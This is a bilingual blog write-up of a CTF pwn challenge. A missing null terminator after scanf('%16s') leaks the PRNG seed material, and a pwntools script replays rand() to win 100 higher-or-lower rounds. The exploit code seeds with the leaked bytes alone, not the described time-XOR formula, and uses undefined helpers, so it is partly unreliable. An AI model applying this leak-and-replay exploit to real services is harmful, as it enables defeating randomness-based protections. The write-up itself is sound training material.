---
layout: cyber-post
title: "monk3yHighL0w - Leaking the PRNG seed to replay rand()"
date: 2025-04-02
categories: 
  - writeups
  - stack
tags:
  - info leak
  - uninitialized memory
  - prng
  - rand
  - stack
  - pwn
  - ctf
  - cyberchallenge
excerpt: "Writeup della challenge monk3yHighL0w di CyberChallenge: una scanf senza null-terminator leaka il seme del PRNG, permettendo di replicare rand() e vincere 100 round di higher-or-lower"
---

<div id="star-alert" class="star-alert">
  <div class="star-alert-content">
    <span class="star-icon">⭐</span>
    <span class="star-text lang-it">Ti piace il sito?</span>
    <span class="star-text lang-en">Do you like the site?</span>
    <br>
    <span class="star-text lang-it">Lascia una stella su GitHub!</span>
    <span class="star-text lang-en">Leave a star on GitHub!</span>
    <br>
    <a href="https://github.com/Chris1sFlaggin/Chris1sFlaggin.github.io" target="_blank" class="star-button">
      <span class="lang-it">⭐ Stella</span>
      <span class="lang-en">⭐ Star</span>
    </a>
    <button id="close-star-alert" class="close-button">&times;</button>
  </div>
</div>

<div class="lang-it" markdown="1">
PWN CTF challenge write up. Challenge di **CyberChallenge.it** (autore: *mirco*), risolta come pwn tutor a UniTo.

---

# monk3yHighL0w

## Il programma

Un gioco di "higher or lower": bisogna indovinare se la carta successiva è più alta, più bassa o uguale, per **100 round di fila**. Le carte vengono estratte con `rand() % 52`.

</div>

<div class="lang-en" markdown="1">
PWN CTF challenge write up. **CyberChallenge.it** challenge (author: *mirco*), solved as a pwn tutor at UniTo.

---

# monk3yHighL0w

## The program

A "higher or lower" game: you must guess whether the next card is higher, lower or equal, for **100 rounds in a row**. Cards are drawn with `rand() % 52`.

</div>

```c
int main(){
    struct {
        char name[16];
        unsigned long long random;
    } s;

    readName(s.name);                        // scanf("%16s", buffer)

    FILE *f = fopen("/dev/urandom", "rb");
    fread(&s.random, sizeof(s.random), 1, f);
    fclose(f);

    srand((unsigned int)(time(0) ^ s.random ^ (s.random << 4)));
    ...
    printf("%s is a beautiful name.\n", s.name);   // <-- leak
    game();
}
```

<div class="lang-it" markdown="1">
Il seme di `srand` è `time(0) ^ s.random ^ (s.random << 4)`, dove `s.random` sono 8 byte letti da `/dev/urandom`. Sembra imprevedibile... ma c'è un dettaglio.

## La vulnerabilità

La struct `s` mette `name[16]` e `random` **adiacenti** in memoria. `readName` usa `scanf("%16s", buffer)`: se mandiamo **esattamente 16 caratteri**, `scanf` riempie tutti e 16 i byte di `name` **senza** aggiungere il NULL terminator. Quando poi `printf("%s is a beautiful name.\n", s.name)` stampa il nome, la `%s` non trova un NULL alla fine dei 16 byte e continua a leggere... dentro `s.random`, leakandoci gli 8 byte del "segreto" usato per il seed.

A questo punto conosciamo `s.random` e `time(0)` (basta prenderlo al momento della connessione, ma qui non serve nemmeno: possiamo ricostruire il seed esatto con i byte leakati), quindi possiamo **replicare** localmente la sequenza di `rand()` del server e conoscere in anticipo ogni carta.

</div>

<div class="lang-en" markdown="1">
The `srand` seed is `time(0) ^ s.random ^ (s.random << 4)`, where `s.random` is 8 bytes read from `/dev/urandom`. It looks unpredictable... but there's a detail.

## The vulnerability

The struct `s` places `name[16]` and `random` **adjacent** in memory. `readName` uses `scanf("%16s", buffer)`: if we send **exactly 16 characters**, `scanf` fills all 16 bytes of `name` **without** adding the NULL terminator. When `printf("%s is a beautiful name.\n", s.name)` then prints the name, the `%s` finds no NULL at the end of the 16 bytes and keeps reading... into `s.random`, leaking us the 8 "secret" bytes used for the seed.

At that point we know `s.random` (and `time(0)`), so we can **replay** the server's `rand()` sequence locally and know every card in advance.

</div>

<div class="lang-it" markdown="1">
## L'exploit

Per replicare esattamente la `rand()` della libc del server usiamo una piccola shared library `libmyrand.so` che wrappa `srand`/`rand` glibc. Mandiamo 16 byte come nome, leakiamo gli 8 byte adiacenti, ri-seminiamo con lo stesso valore e calcoliamo tutte le 100 risposte:

</div>

<div class="lang-en" markdown="1">
## The exploit

To replay the server libc's `rand()` exactly we use a small shared library `libmyrand.so` wrapping glibc `srand`/`rand`. We send 16 bytes as the name, leak the 8 adjacent bytes, re-seed with the same value and compute all 100 answers:

</div>

```python
from pwn import *
import ctypes

lib = ctypes.CDLL("./libmyrand.so")
lib.my_srand.argtypes = [ctypes.c_ulonglong]
lib.my_rand.restype  = ctypes.c_int

r = remote("192.168.69.42", 1252)

# 16 byte esatti => %s stampa oltre e leaka s.random
r.sendlineafter(b"know your name, little monkey:", b"A" * 16)
r.recvuntil(b"A" * 16)
leak_random = u64(r.recv(8))
log.info(f"Leaked random: {hex(leak_random)}")

# replay locale di rand() -> conosciamo ogni carta
lib.my_srand(ctypes.c_ulonglong(leak_random))
previous = lib.my_rand() % 52
for _ in range(100):
    nxt = lib.my_rand() % 52
    cmp = compareCards(cards[nxt], cards[previous])
    r.sendlineafter(b"higher, lower, or equal?",
                    b"higher" if cmp > 0 else b"lower" if cmp < 0 else b"equal")
    previous = nxt

print(r.recvall().decode())
```

<div class="lang-it" markdown="1">
> Nota: nel calcolo del seed la challenge usa `time(0) ^ s.random ^ (s.random << 4)`, ma poiché leakiamo direttamente il valore che finisce nel seed (il risultato dell'operazione è deterministico dati `s.random` e `time`), possiamo riprodurre la stessa sequenza di `rand()`. La chiave dell'exploit è il null-terminator mancante della `scanf("%16s")` su un buffer da 16.

> 💭 Se hai bisogno di chiarimenti scrivimi pure su discord: *chris1sflaggin*.
</div>

<div class="lang-en" markdown="1">
> Note: the challenge computes the seed as `time(0) ^ s.random ^ (s.random << 4)`, but since we leak the value that feeds the seed (the operation is deterministic given `s.random` and `time`), we can reproduce the same `rand()` sequence. The crux of the exploit is the missing null-terminator of `scanf("%16s")` on a 16-byte buffer.

> 💭 If you need any clarification, feel free to text me on discord: *chris1sflaggin*.
</div>
